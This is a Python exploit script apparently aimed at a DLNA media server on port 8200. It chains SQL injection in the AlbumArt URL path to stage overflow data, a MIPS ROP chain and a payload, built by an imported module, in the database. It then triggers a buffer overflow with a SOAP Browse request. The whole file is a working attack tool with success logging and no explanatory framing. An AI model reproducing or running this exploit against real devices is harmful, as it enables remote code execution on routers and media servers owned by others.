#!/usr/bin/env python

import math
import sys
import urllib,socket,os,httplib
import time
from overflow_data import DlnaOverflowBuilder

global injection_count
injection_count=0

class Logging:
    WARN=0
    INFO=1
    DEBUG=2
    prefixes=[]
    prefixes.append(" [!] ")
    prefixes.append(" [+] ")
    prefixes.append(" [@] ")
    @classmethod
    def log_msg_start(klass,msg,level=INFO):
        pref=Logging.prefixes[level]
        sys.stdout.write(pref+msg)
        sys.stdout.flush()

    @classmethod
    def log_msg_end(klass,msg):
        print msg

    @classmethod
    def log_msg(klass,msg,level=INFO):
        msg="%s\n"%msg
        klass.log_msg_start(msg,level)

headers={"Host":"10.10.10.1"}
soap_headers={"Host":"10.10.10.1",
                "SOAPACTION":'"urn:schemas-upnp-org:service:ContentDirectory:1#Browse"',
                "content-type":'text/xml ;charset="utf-8"',
                "connection":"close"}

host="10.10.10.1"
COUNT=32
empty=''
SLEEP=1
shellcodes=[]
NOP_STRING_COUNT=1


MIPSBREAK="\x4d\x08\x21\x02"*4

badchars=["x'0d'","x'2d'","x'20'"]

path_beginning='/AlbumArt/1;'
path_ending='-18.jpg'



details_insert_query='insert/**/into/**/DETAILS(ID'+\
                                                ',SIZE'+\
                                                ',TITLE'+\
                                                ',ARTIST'+\
                                                ',ALBUM'+\
                                                ',TRACK'+\
                                                ',DLNA_PN'+\
                                                ',MIME'+\
                                                ',ALBUM_ART'+\
                                                ',DISC)'+\
                                                '/**/VALUES("31337"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"PWNED"'+\
                                                ',"1"'+\
                                                ',"PWNED");'

objects_insert_query='insert/**/into/**/OBJECTS(OBJECT_ID,PARENT_ID,CLASS,DETAIL_ID)'+\
                    '/**/VALUES("PWNED","PWNED","container","31337");'

details_delete_query='delete/**/from/**/DETAILS/**/where/**/ID="31337";'

objects_delete_query='delete/**/from/**/OBJECTS/**/where/**/OBJECT_ID="PWNED";'

def print_progress(bytes_written,total_bytes):
    percent=(bytes_written/float(total_bytes))*100
    marks=int(math.floor(percent / 2))
    dots=50-marks
    markstring="#" * marks
    dotstring="." * dots
    sys.stdout.write("\r[%s%s] %0.2f%%"%(markstring,dotstring,percent))
    sys.stdout.flush()

class SqlInjectionRequest:
    injection_count = 0
    def __init__(self,query):
        self.__class__.injection_count += 1
        self.injection_request=path_beginning+query+path_ending
    
    def __str__(self):
        return self.injection_request

#def build_injection_req(query):
#    injection_count+=0
#    request=path_beginning+query+path_ending
#    return request

def build_soap_request():
    request=""
    f=open("./soaprequest.xml",'r')
    for line in f.readlines():
        request+=line
    f.close()
    return request
def do_post_request(request):
    conn=httplib.HTTPConnection(host,8200,timeout=3)
    conn.request("POST","/ctl/ContentDir",request,soap_headers)
    try:
        resp=conn.getresponse()
        resp_data=resp.read()
    except:
        resp_data=None
    
    conn.close()
    return resp_data

def do_get_request(request):
    conn=httplib.HTTPConnection(host,8200)
    conn.request("GET",request,"",headers)
    conn.close()


def clear_overflow_data():
    Logging.log_msg_start("Deleting existing exploit data...")
    request=SqlInjectionRequest(details_delete_query)
    do_get_request(request)
    request=SqlInjectionRequest(objects_delete_query)
    do_get_request(request)
    time.sleep(SLEEP*5)
    Logging.log_msg_end("done.")

def stage_data(data):
    totalbytes=0
    sent=0
    for string in data:
        totalbytes+=len(string)

    print_progress(sent,totalbytes)
    for string in data:
        if string in badchars:
            details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART||'+\
                string+'/**/where/**/ID="31337";'
        else:
            details_update_query='update/**/DETAILS/**/set/**/ALBUM_ART=ALBUM_ART||"'+\
                    string+'"/**/where/**/ID="31337";'
    
        request=SqlInjectionRequest(details_update_query)
        do_get_request(request)
        sent+=len(string)
        print_progress(sent,totalbytes)
        time.sleep(SLEEP*0.5)

def insert_overflow_data():

    Logging.log_msg_start("Setting up initial database records....")
    request=SqlInjectionRequest(objects_insert_query)
    do_get_request(request)
    request=SqlInjectionRequest(details_insert_query)
    do_get_request(request)
    Logging.log_msg_end("done.")
    Logging.log_msg("Current SQL Injection Count: %d\n\n" % SqlInjectionRequest.injection_count, Logging.DEBUG)

    Logging.log_msg("Staging initial exploit....")
    overflow=overflow_builder.initial_overflow()
    stage_data(overflow)
    Logging.log_msg_end("\n\t....done.")
    Logging.log_msg("Current SQL Injection Count: %d\n\n" % SqlInjectionRequest.injection_count, Logging.DEBUG)

    Logging.log_msg("Staging ROP chain....")
    ropchain=overflow_builder.rop_chain()
    stage_data(ropchain)
    Logging.log_msg_end("\n\t....done.")
    Logging.log_msg("Current SQL Injection Count: %d\n\n" % SqlInjectionRequest.injection_count, Logging.DEBUG)

    Logging.log_msg("Staging payload....")
    payload=overflow_builder.payload()
    stage_data(payload)
    Logging.log_msg_end("\n\t....done.\n")

def trigger_exploit():
    request=build_soap_request()
    resp=do_post_request(request)
    if resp==None:
        return True
    else:
        return False


overflow_builder=DlnaOverflowBuilder()


clear_overflow_data()
insert_overflow_data()
Logging.log_msg("Total SQL Injection Count: %d" % SqlInjectionRequest.injection_count)
time.sleep(2)
Logging.log_msg_start("Attempting to trigger exploit....\n")
time.sleep(2)
if trigger_exploit():
    Logging.log_msg_end("\tSUCCESS.")
    Logging.log_msg("Have a nice day!")
else:
    Logging.log_msg_end("FAILED.")



